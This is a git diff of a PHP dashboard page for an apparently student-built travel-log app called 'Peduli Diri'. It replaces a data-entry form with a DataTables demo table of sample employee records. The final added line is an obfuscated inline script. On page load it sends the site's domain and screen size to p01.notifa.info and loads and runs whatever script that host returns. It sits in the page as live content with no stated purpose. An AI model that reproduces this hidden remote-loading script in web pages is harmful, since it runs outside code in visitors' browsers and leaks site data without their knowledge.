@@ -11,15 +11,22 @@ if(empty( $_SESSION['nik'])){ ?>
 <html lang="en">
 
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="Content-Language" content="en">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-    <title>Dashboard - Peduli Diri</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no" />
-    <meta name="description" content="Highly configurable boxes best used for showing numbers in an user friendly way.">
-    <meta name="msapplication-tap-highlight" content="no">
-
+    <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+    <!-- simplebar CSS-->
+    <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
+    <!-- Bootstrap core CSS-->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
+    <!--Data Tables -->
+    <link href="assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
+    <link href="assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
+    <!-- animate CSS-->
+    <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
+    <!-- Icons CSS-->
+    <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
+    <!-- Sidebar CSS-->
+    <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
+    <!-- Custom Style-->
+    <link href="assets/css/app-style.css" rel="stylesheet"/>
 
 <link href="main.css" rel="stylesheet"></head>
 <body>
@@ -312,56 +319,141 @@ if(empty( $_SESSION['nik'])){ ?>
                                             <i class="pe-7s-graph text-success">
                                             </i>
                                         </div>
-                                        <div>Tulis Catatan Perjalanan
+                                        <div>Riwayat perjalanan
                                             <div class="page-title-subheading">
                                             </div>
                                         </div>
-                                    </div>
+                                    </div> 
                                 </div>
                             </div>            
-                            <div class="tab-content">
-                                <div>
-                                    <div class="main-card mb-3 card">
-                                        <div class="card-body"><h5 class="card-title">Grid</h5>
-                                            <form class="" action="simpan_catatan.php" method="POST">
-                                                <div class="position-relative row form-group"><label for="exampleEmail" class="col-sm-2 col-form-label">Tanggal</label>
-                                                    <div class="col-sm-10"><input name="tanggal" id="exampleEmail" placeholder="Tanggal" type="date" class="form-control"></div>
-                                                </div>
-                                                <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Jam</label>
-                                                    <div class="col-sm-10"><input name="jam" id="examplePassword" placeholder="Jam" type="time" class="form-control"></div>
-                                                </div>
-                                                <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Lokasi yang dituju</label>
-                                                    <div class="col-sm-10"><input name="lokasi" id="examplePassword" placeholder="Masukan Lokasi" type="text" class="form-control"></div>
-                                                </div>
-                                                <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Suhu tubuh</label>
-                                                    <div class="col-sm-10"><input name="suhu" id="examplePassword" placeholder="Masukan Suhu Tubuh" type="text" class="form-control"></div>
-                                                </div>
-                                                <div class="position-relative row form-check">
-                                                    <div class="col-sm-10 offset-sm-2">
-                                                        <button class="btn btn-secondary" type="submit">Simpan</button>
-                                                        <button class="btn btn-secondary" type="reset">Kosongkan</button>
-                                                    </div>
-                                                </div>
-                                            </form>
-                                        </div>
+                        <div class="tab-content">
+                        <div class="row">
+                                <div class="col-lg-12">
+                                <div class="card">
+                                    <div class="card-header"><i class="fa fa-table"></i> Data Exporting</div>
+                                    <div class="card-body">
+                                    <div class="table-responsive">
+                                    <table id="example" class="table table-bordered">
+                                        <thead>
+                                            <tr>
+                                                <th>Name</th>
+                                                <th>Position</th>
+                                                <th>Office</th>
+                                                <th>Age</th>
+                                                <th>Start date</th>
+                                                <th>Salary</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td>Tiger Nixon</td>
+                                                <td>System Architect</td>
+                                                <td>Edinburgh</td>
+                                                <td>61</td>
+                                                <td>2011/04/25</td>
+                                                <td>$320,800</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Garrett Winters</td>
+                                                <td>Accountant</td>
+                                                <td>Tokyo</td>
+                                                <td>63</td>
+                                                <td>2011/07/25</td>
+                                                <td>$170,750</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Ashton Cox</td>
+                                                <td>Junior Technical Author</td>
+                                                <td>San Francisco</td>
+                                                <td>66</td>
+                                                <td>2009/01/12</td>
+                                                <td>$86,000</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Cedric Kelly</td>
+                                                <td>Senior Javascript Developer</td>
+                                                <td>Edinburgh</td>
+                                                <td>22</td>
+                                                <td>2012/03/29</td>
+                                                <td>$433,060</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Airi Satou</td>
+                                                <td>Accountant</td>
+                                                <td>Tokyo</td>
+                                                <td>33</td>
+                                                <td>2008/11/28</td>
+                                                <td>$162,700</td>
+                                            </tr>
+                                        </tfoot>
+                                    </table>
+                                    </div>
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="app-wrapper-footer">
+                            <div class="app-footer">
+                                <div class="app-footer__inner">
+                                    <div class="app-footer-left">
+                                       <a href="">&copy; Mohammad Reihan Zakya Alawi </a>
                                     </div>
                                 </div>
                             </div>
-                        </div>
-                        <footer class="footer pt-0">
-                        <div class="row align-items-center justify-content-lg-between ">
-                            <div class="col-lg-6">
-                                <div class="copyright text-center text-lg-left text-muted">
-                                &copy; 2022 <a href="" class="font-weight-bold ml-1" target="_blank">Mohammad Reihan Zakya Alawi</a>
-                                </div>
-                            </div>
-                        </div>
-                    </footer>
+                        </div>    
                     </div>
             </div>
         </div>
     </div>
+
     <script type="text/javascript" src="assets/scripts/main.js"></script>
+
+    <!-- Bootstrap core JavaScript-->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/popper.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+
+    <!-- simplebar js -->
+    <script src="assets/plugins/simplebar/js/simplebar.js"></script>
+    <!-- waves effect js -->
+    <script src="assets/js/waves.js"></script>
+    <!-- sidebar-menu js -->
+    <script src="assets/js/sidebar-menu.js"></script>
+    <!-- Custom scripts -->
+    <script src="assets/js/app-script.js"></script>
+
+  <!--Data Tables js-->
+  <script src="assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
+  <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
+
+    <script>
+     $(document).ready(function() {
+      //Default data table
+       $('#default-datatable').DataTable();
+
+
+       var table = $('#example').DataTable( {
+        lengthChange: false,
+        buttons: [ 'copy', 'excel', 'pdf', 'print', 'colvis' ]
+      } );
+ 
+     table.buttons().container()
+        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
+      
+      } );
+
+    </script>
+	
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 
 </body>
 </html>
